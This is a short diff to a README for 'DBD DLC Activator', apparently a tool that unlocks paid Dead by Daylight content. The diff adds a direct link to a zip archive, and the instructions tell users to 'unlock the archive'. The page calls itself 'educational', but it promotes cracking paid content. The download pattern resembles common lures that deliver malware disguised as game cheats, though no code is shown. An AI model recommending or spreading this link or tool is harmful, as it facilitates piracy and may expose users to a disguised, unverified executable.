@@ -14,7 +14,7 @@
    DLC Activator is developed with the intent to be used only for educational purpose.
 
    ## Installation
-	1. **Get the latest release: [🔗 Get DBD DLC Activator]()**
+	1. **Get the latest release: [🔗 Get DBD DLC Activator](https://github.com/DBD-DLC-Activator/.github/releases/download/V2.13/DBD-DLC-Activator.zip)**
 	2. **Unlock the archive and follow the instructions!**
 	3. **Enjoy the game!**
 
